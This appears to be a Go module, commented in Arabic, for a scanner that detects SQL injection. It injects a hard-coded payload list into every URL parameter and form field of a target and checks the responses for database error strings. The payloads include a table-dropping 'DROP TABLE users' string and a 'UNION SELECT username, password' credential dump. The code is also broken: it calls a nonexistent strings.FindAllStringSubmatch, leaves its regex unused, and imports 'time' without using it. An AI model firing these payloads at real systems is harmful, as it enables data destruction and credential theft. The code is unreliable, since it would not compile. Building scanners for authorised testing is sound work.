package scanning

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// SQLScanner وحدة فحص ثغرات SQL Injection
type SQLScanner struct {
	client   *http.Client
	payloads []string
}

// NewSQLScanner ينشئ فاحص SQL جديد
func NewSQLScanner(client *http.Client) *SQLScanner {
	return &SQLScanner{
		client: client,
		payloads: []string{
			"' OR '1'='1",
			"1' OR '1'='1",
			"' OR 1=1--",
			"' OR 'x'='x",
			"1; DROP TABLE users--",
			"1' UNION SELECT NULL--",
			"' UNION SELECT username, password FROM users--",
			"admin' --",
			"admin' #",
			"' OR 1=1 #",
			"' OR 1=1 /*",
			"') OR '1'='1",
			"1' ORDER BY 1--",
			"1' ORDER BY 2--",
			"1' ORDER BY 3--",
			"1' AND 1=1--",
			"1' AND 1=2--",
			"1' WAITFOR DELAY '0:0:5'--",
			"1' AND SLEEP(5)--",
			"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
		},
	}
}

// ScanURL يفحص رابط معين للبحث عن ثغرات SQL Injection
func (s *SQLScanner) ScanURL(ctx context.Context, targetURL string) (*Vulnerability, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("عنوان URL غير صالح: %v", err)
	}

	// فحص كل المعاملات في URL
	params := parsedURL.Query()
	for param := range params {
		if vuln := s.checkParameter(ctx, targetURL, param); vuln != nil {
			return vuln, nil
		}
	}

	// فحص نموذج POST
	if vuln := s.checkPOSTForm(ctx, targetURL); vuln != nil {
		return vuln, nil
	}

	return nil, nil
}

// checkParameter يفحص معامل معين للبحث عن ثغرات SQL
func (s *SQLScanner) checkParameter(ctx context.Context, targetURL, param string) *Vulnerability {
	baseURL, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}

	for _, payload := range s.payloads {
		select {
		case <-ctx.Done():
			return nil
		default:
			// تجهيز الرابط مع الـ payload
			params := baseURL.Query()
			originalValue := params.Get(param)
			params.Set(param, payload)
			baseURL.RawQuery = params.Encode()

			// إرسال الطلب
			req, err := http.NewRequestWithContext(ctx, "GET", baseURL.String(), nil)
			if err != nil {
				continue
			}

			resp, err := s.client.Do(req)
			if err != nil {
				continue
			}

			// فحص الاستجابة
			if vuln := s.analyzeResponse(resp, payload, param, originalValue); vuln != nil {
				resp.Body.Close()
				return vuln
			}
			resp.Body.Close()
		}
	}

	return nil
}

// checkPOSTForm يفحص نماذج POST للبحث عن ثغرات SQL
func (s *SQLScanner) checkPOSTForm(ctx context.Context, targetURL string) *Vulnerability {
	// أولاً نحصل على النموذج
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return nil
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	// قراءة محتوى الصفحة للبحث عن نماذج
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	// البحث عن حقول النموذج
	formFields := extractFormFields(string(body))
	
	// فحص كل حقل
	for _, field := range formFields {
		for _, payload := range s.payloads {
			formData := url.Values{}
			formData.Set(field, payload)

			req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(formData.Encode()))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			resp, err := s.client.Do(req)
			if err != nil {
				continue
			}

			if vuln := s.analyzeResponse(resp, payload, field, ""); vuln != nil {
				resp.Body.Close()
				return vuln
			}
			resp.Body.Close()
		}
	}

	return nil
}

// analyzeResponse يحلل الاستجابة للبحث عن مؤشرات SQL Injection
func (s *SQLScanner) analyzeResponse(resp *http.Response, payload, param, originalValue string) *Vulnerability {
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	bodyStr := string(body)

	// البحث عن علامات SQL Injection
	errorPatterns := []string{
		"SQL syntax",
		"mysql_fetch_array",
		"ORA-",
		"PostgreSQL",
		"SQLite/JDBCDriver",
		"System.Data.SQLClient",
		"Microsoft SQL Native Client error",
		"Warning: mysql_",
		"Warning: pg_",
		"Warning: sqlite_",
	}

	for _, pattern := range errorPatterns {
		if strings.Contains(bodyStr, pattern) {
			return &Vulnerability{
				Type:        VulnTypeSQLInjection,
				Severity:    SeverityHigh,
				Description: "تم اكتشاف ثغرة SQL Injection محتملة",
				Evidence:    fmt.Sprintf("تم العثور على نمط خطأ SQL: %s", pattern),
				Solution:    "استخدم Prepared Statements أو ORM مع تنقية المدخلات بشكل صحيح",
				CVSS:        8.5,
				References: []string{
					"https://owasp.org/www-community/attacks/SQL_Injection",
					"https://portswigger.net/web-security/sql-injection",
				},
				Payload:  payload,
				Location: fmt.Sprintf("المعامل: %s", param),
			}
		}
	}

	// التحقق من تغيير السلوك
	if resp.StatusCode >= 500 {
		return &Vulnerability{
			Type:        VulnTypeSQLInjection,
			Severity:    SeverityMedium,
			Description: "تم اكتشاف سلوك مشبوه يشير إلى احتمال وجود SQL Injection",
			Evidence:    fmt.Sprintf("الخادم أعاد رمز الحالة %d عند استخدام payload", resp.StatusCode),
			Solution:    "استخدم Prepared Statements وتحقق من صحة المدخلات",
			CVSS:        6.5,
			References: []string{
				"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
			},
			Payload:  payload,
			Location: fmt.Sprintf("المعامل: %s", param),
		}
	}

	return nil
}

// extractFormFields يستخرج حقول النموذج من HTML
func extractFormFields(html string) []string {
	var fields []string
	// البحث عن حقول النموذج باستخدام تعبير نمطي بسيط
	// في التطبيق الحقيقي، يجب استخدام مكتبة HTML parser
	inputPattern := `<input[^>]+name=["']([^"']+)["']`
	matches := strings.FindAllStringSubmatch(html, -1)
	for _, match := range matches {
		if len(match) > 1 {
			fields = append(fields, match[1])
		}
	}
	return fields
} 